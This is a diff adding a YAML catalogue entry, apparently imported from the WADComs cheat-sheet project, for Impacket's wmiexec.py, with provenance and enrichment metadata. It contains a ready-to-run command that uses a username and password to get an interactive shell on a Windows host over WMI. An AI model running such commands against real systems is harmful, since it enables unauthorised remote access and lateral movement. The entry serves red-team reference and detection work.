@@ -1,0 +1,77 @@
+id: wadcoms/Impacket-WMIExec
+type: technique
+platform: active-directory
+name: Impacket WMIExec
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 wmiexec.py test.local/john:password123@10.10.10.1
+  comment: "Impacket's wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive\
+    \ shell on the Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\
+    \n\tUsername: john\n\n\tPassword: password123\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
+- https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy
+tags:
+- active-directory
+- wadcoms
+- wmi
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-WMIExec.md
+      document: "---\ndescription: |\n  Impacket's wmiexec.py uses the Windows Management Instrumentation\
+        \ (WMI) to give you an interactive shell on the Windows host.\n\n  Command Reference:\n\n  \t\
+        Target IP: 10.10.10.1\n\n  \tDomain: test.local\n\n  \tUsername: john\n\n  \tPassword: password123\n\
+        command: |\n  python3 wmiexec.py test.local/john:password123@10.10.10.1\nitems:\n  - Password\n\
+        \  - Username\nservices:\n  - WMI\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n\
+        references:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py\n\
+        \  - https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:f1167db99576180295edb357ed807dc99ab40312b6b11625a8bd61341e132c95
